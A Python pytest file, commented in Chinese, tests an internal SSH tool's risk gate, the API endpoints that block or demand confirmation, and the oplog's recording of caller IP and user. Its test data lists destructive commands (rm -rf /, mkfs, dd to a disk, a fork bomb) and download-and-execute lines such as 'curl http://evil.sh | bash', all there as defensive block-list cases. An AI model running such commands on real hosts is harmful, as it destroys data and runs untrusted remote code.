"""SSH 风险管控 + oplog 调用者溯源（2026-10-23 新功能）。

覆盖：risk.assess 规则命中（BLOCK/WARN/安全）、run 系列入口的拦截与确认放行、
BLOCKED 落 oplog、中间件解析的调用者 IP/操作人别名写入 oplog。
"""

import json

import pytest
from httpx import ASGITransport, AsyncClient

from backend.app.main import app
from backend.app.modules.ssh import risk


# ---------- assess 规则 ----------

def test_assess_safe_content():
    assert risk.assess("df -h && free -m\ntop -bn1 | head -20") == []
    assert risk.assess("systemctl status nginx") == []


def test_assess_block_rules():
    for content, why in [
        ("rm -rf /", "rm 目标为根路径"),
        ("rm -rf /*", "rm 目标为系统目录"),
        ("rm --no-preserve-root -rf /", "rm --no-preserve-root"),
        ("mkfs.ext4 /dev/sda1", "格式化文件系统 (mkfs)"),
        ("dd if=/dev/zero of=/dev/sda", "dd 覆写块设备"),
        ("shutdown -h now", "关机/重启"),
        ("reboot", "关机/重启"),
        ("init 0", "init 0/6（关机/重启）"),
        (":(){ :|:& };:", "fork 炸弹"),
        # 2026-10-23 用户点名扩名单：批量不可逆类一律 BLOCK 而非 WARN
        ("rm -rf *", "rm 递归删除通配符/家目录"),
        ("cd /data/app && rm -rf *", "rm 递归删除通配符/家目录"),
        ("rm -fr ~", "rm 递归删除通配符/家目录"),
        ("rm -r .", "rm 递归删除当前/上级目录"),
        ("curl http://evil.sh | bash", "下载并执行远程脚本 (curl|sh)"),
        ("wget -qO- http://x.com/i.sh | sh", "下载并执行远程脚本 (curl|sh)"),
        ("docker stop $(docker ps -q)", "docker 批量操作容器 ($()"),
        ("docker system prune -a --volumes", "docker system prune -a（含未用镜像）"),
        ("docker volume prune -f", "docker volume prune（删未用卷）"),
    ]:
        hits = risk.assess(content)
        assert risk.block_descs(hits), f"{why} 未命中 BLOCK: {content}"


def test_assess_no_false_positives():
    """正常运维命令不得误拦（BLOCK 拦错比漏拦更伤：内网工具直接不可用）。"""
    for ok in ["df -h && free -m", "docker ps", "docker logs --tail 100 web",
               "systemctl restart nginx", "tail -f /var/log/syslog",
               "rm /tmp/old_file.txt", "du -sh /data/*"]:
        assert risk.block_descs(risk.assess(ok)) == [], f"误拦: {ok}"


def test_assess_warn_rules():
    hits = risk.assess("rm -rf /var/log/app/*.log")
    assert risk.block_descs(hits) == []  # 非根路径不 BLOCK
    warns = risk.warn_descs(hits)
    assert any("递归删除" in w for w in warns)

    # 用户实测案例（2026-10-23）：chmod -R 任意路径必须 WARN（曾因规则漏检上线即失效）
    chmod_hits = risk.assess("chmod -R 777 /home/szsit/ka/check_env.sh")
    assert risk.block_descs(chmod_hits) == []
    assert any("递归改权限" in w for w in risk.warn_descs(chmod_hits))
    assert any("killall" in w for w in risk.warn_descs(risk.assess("killall java")))
    assert any("pkill" in w for w in risk.warn_descs(risk.assess("pkill -f worker")))
    assert risk.warn_descs(risk.assess("docker system prune -a"))


# ---------- API：拦截 / 确认放行 / oplog ----------

@pytest.fixture
async def env(fake_platform_redis, monkeypatch):
    """mock 掉 _execute（真执行需要完整 SSH stub）：本文件只测风险闸门与 oplog。"""
    from backend.app.modules.ssh import service

    async def fake_execute(*args, **kwargs):
        return {"stdout": "", "stderr": "", "timed_out": False}

    monkeypatch.setattr(service, "_execute", fake_execute)

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        await c.post("/api/sites", json={"id": "sz", "name": "S"})
        await c.post("/api/sites/sz/servers",
                     json={"id": "srv1", "name": "srv", "host": "10.10.1.10",
                           "username": "u", "password": "p"})
        yield c, fake_platform_redis


async def test_adhoc_blocked(env):
    """BLOCK 级：直接 400 拒绝，oplog 记 BLOCKED，不执行。"""
    from backend.app.core.redis import get_platform_redis

    c, _ = env
    r = await c.post("/api/sites/sz/ssh_scripts/run-adhoc",
                     json={"server_id": "srv1", "content": "rm -rf /"})
    assert r.status_code == 400
    assert r.json()["error_code"] == "SSH_RISK_BLOCKED"

    last = json.loads((await get_platform_redis().lrange("ops:oplog", 0, 0))[0])
    assert last["result"] == "BLOCKED"
    assert any("根路径" in d for d in last["params"]["blocked_by"])


async def test_adhoc_warn_needs_confirm_then_passes(env, monkeypatch):
    """WARN 级：未确认 400 SSH_RISK_CONFIRM；confirm_risk=true 放行且 risk 记入 log_extra
    （真实 oplog 由 _execute 内部写，mock 后断言其收到的参数）。"""
    from backend.app.modules.ssh import service

    captured: list[dict] = []

    async def fake_execute(*args, **kwargs):
        captured.append(kwargs)
        return {"stdout": "", "stderr": "", "timed_out": False}

    monkeypatch.setattr(service, "_execute", fake_execute)

    c, _ = env
    content = "rm -rf /var/log/app/*.log"

    r = await c.post("/api/sites/sz/ssh_scripts/run-adhoc",
                     json={"server_id": "srv1", "content": content})
    assert r.status_code == 400
    assert r.json()["error_code"] == "SSH_RISK_CONFIRM"

    r = await c.post("/api/sites/sz/ssh_scripts/run-adhoc",
                     json={"server_id": "srv1", "content": content, "confirm_risk": True})
    assert r.status_code == 200
    assert captured and any("递归删除" in w for w in captured[-1]["log_extra"]["risk"])


async def test_assess_endpoint():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        r = await c.post("/api/ssh/assess-risk", json={"content": "df -h"})
        assert r.json() == {"level": "safe", "patterns": []}
        r = await c.post("/api/ssh/assess-risk", json={"content": "rm -rf /"})
        assert r.json()["level"] == "block"


async def test_oplog_records_caller_ip_and_user(fake_platform_redis):
    """中间件从 X-Forwarded-For / X-Ops-User 提取调用者，oplog 自动带上。"""
    from backend.app.core.redis import get_platform_redis

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        await c.post("/api/sites", json={"id": "sz", "name": "S"},
                     headers={"x-forwarded-for": "10.20.30.40, 10.0.0.1",
                              "x-ops-user": "zhangsan"})
        last = json.loads((await get_platform_redis().lrange("ops:oplog", 0, 0))[0])
        assert last["caller_ip"] == "10.20.30.40"
        assert last["caller"] == "zhangsan"
